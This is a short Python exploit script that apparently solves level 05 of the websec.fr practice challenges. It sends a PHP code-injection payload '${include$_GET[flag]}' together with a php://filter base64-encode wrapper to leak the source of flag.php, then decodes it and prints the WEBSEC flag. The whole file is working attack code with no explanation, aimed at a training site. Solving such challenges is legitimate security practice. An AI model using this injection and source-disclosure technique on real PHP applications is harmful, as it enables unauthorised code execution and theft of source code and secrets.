from requests import *
import base64

url = 'http://websec.fr/level05/index.php?flag=php://filter/convert.base64-encode/resource=flag.php'
payload = '${include$_GET[flag]}'
data = {
    'q' : payload,
    'submit' : ''
}

r = post(url , data=data)
pos = r.text.find('PD9wa')
flag_base64 = ''
while (True):
    txt = r.text[pos]
    if (txt == '<'):
        break
    flag_base64 += r.text[pos]
    pos += 1

flag = base64.b64decode(flag_base64).decode('utf-8')

pos = flag.find('WEBSEC{')
while (True):
    txt = flag[pos]
    print(txt , end='')
    if (txt == '}'):
        print()
        break
    pos += 1
